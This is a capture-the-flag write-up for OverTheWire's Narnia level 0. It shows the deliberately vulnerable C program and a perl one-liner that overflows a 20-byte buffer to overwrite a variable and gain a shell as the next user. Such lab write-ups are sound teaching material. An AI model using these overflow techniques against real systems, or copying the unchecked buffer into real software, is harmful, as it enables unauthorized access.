#Narnia
Narnia is a CTF hosted at overthewire.org/wargames/narnia.  My writeups for the levels will be posted here.
#Level0
Login to level 0 with `ssh narnia0@narnia.labs.overthewire.org` with password naria0.
The levels are all located in the /narnia directory once you are logged in, and the source code for each level is provided.
narnia0.c:
`#include <stdio.h>
#include <stdlib.h>

int main(){
	long val=0x41414141;
	char buf[20];

	printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
	printf("Here is your chance: ");
	scanf("%24s",&buf);

	printf("buf: %s\n",buf);
	printf("val: 0x%08x\n",val);

	if(val==0xdeadbeef)
		system("/bin/sh");
	else {
		printf("WAY OFF!!!!\n");
		exit(1);
	}

	return 0;
}`
Looking at the code we can see that if we overflow buf[20], it will overflow in to val. In order to get the shell, we need to make val contain 0xdeadbeef.
I first entered `perl -e 'print "A"x20 . "\xef\xbe\xad\xde"' | ./narnia0`.  This passed the comparison and allowed the system("/bin/sh") line to execute, but the shell was immediately closed because I didn't have any input to give it. 
Next, I modified my input to be `(perl -e 'print "A"x20 . "\xef\xbe\xad\xde"'; cat) | ./narnia0` which allowed me to keep the shell open (with the shell open as narnia1)
